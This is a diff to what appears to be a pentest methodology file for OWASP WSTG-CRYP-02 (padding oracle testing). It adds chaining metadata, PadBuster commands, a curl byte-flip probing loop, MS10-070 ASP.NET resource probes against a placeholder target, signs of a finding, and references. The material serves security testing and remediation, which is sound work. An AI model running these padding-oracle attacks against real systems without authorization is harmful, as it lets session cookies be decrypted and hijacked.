@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [cryptography, tls, ssl, encryption, wstg, cryp]
 tech_stack: [tls, ssl]
 cwe_ids: [CWE-326]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-cryp-01, wstg-cryp-03]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-cryp-01: "A confirmed padding oracle in CBC-mode tokens combined with weak/downgradable TLS lets an on-path attacker who forces a protocol downgrade fully decrypt session cookies or ViewState byte-by-byte without ever obtaining the encryption key (Critical)"
 ---
 
 # wstg-cryp-02
@@ -216,6 +217,43 @@ padbuster https://target.com/decrypt?data= ENCRYPTED_VALUE 16 \
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Baseline: capture the original encrypted cookie/param value
+ORIG="dGhpc19pc19hX3Rlc3RfY2lwaGVydGV4dA=="
+TARGET="https://target.com/decrypt"
+
+# PadBuster automated attack (auto-detect block size, verbose)
+padbuster "$TARGET?data=" "$ORIG" 16 -encoding 0 -verbose
+
+# PadBuster with cookie-based session and error string to distinguish invalid padding
+padbuster "$TARGET" "$ORIG" 8 \
+  -cookies "session=abc123" \
+  -error "Padding is invalid" \
+  -encoding 0
+
+# Manual byte-flip probe: flip last ciphertext byte through all 256 values, diff responses
+for i in $(seq 0 255); do
+  hex=$(printf '%02x' "$i")
+  b64=$(python3 -c "import base64,sys; d=bytearray(base64.b64decode('$ORIG')); d[-1]=$i; sys.stdout.write(base64.b64encode(bytes(d)).decode())")
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?data=$b64")
+  echo "byte=$hex status=$code"
+done | sort | uniq -c -f1 | sort -rn | head   # one status code should dominate; outliers = padding oracle signal
+
+# ASP.NET known padding-oracle targets (MS10-070)
+curl -s "https://target.com/WebResource.axd?d=$ORIG" -o /dev/null -w "%{http_code}\n"
+curl -s "https://target.com/ScriptResource.axd?d=$ORIG" -o /dev/null -w "%{http_code}\n"
+```
+
+**Result patterns indicating a finding:**
+- HTTP status code differs between "valid padding" and "invalid padding" responses (e.g. 200 vs 500, or a distinct 500 error page) across the byte-flip loop → padding oracle
+- Response body/error text differs (`"Padding is invalid"`, `"MAC check failed"`, generic vs specific decrypt error) for otherwise identical requests → padding oracle
+- Response time consistently differs by a fixed offset for a subset of byte values → timing-based padding oracle
+- PadBuster reports `"No Errors were detected"` combined with a byte returning a unique response signature → exploitable oracle confirmed
+
+---
+
 ## Remediation Guide
 
 ### Use Authenticated Encryption
@@ -269,6 +307,15 @@ plaintext = aesgcm.decrypt(nonce, ciphertext, None)
 | **CWE-209** | Information Exposure Through Error Message                       |
 | **CWE-649** | Reliance on Obfuscation or Encryption without Integrity Checking |
 
+
+---
+
+## References
+
+- [OWASP WSTG-CRYP-02: Testing for Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)
+- [PadBuster (GitHub)](https://github.com/AonCyberLabs/PadBuster)
+- Vaudenay, S. — "Security Flaws Induced by CBC Padding" (original padding oracle paper)
+- [PortSwigger: Padding Oracle Attacks](https://portswigger.net/web-security/all-topics)
 
 ---
 
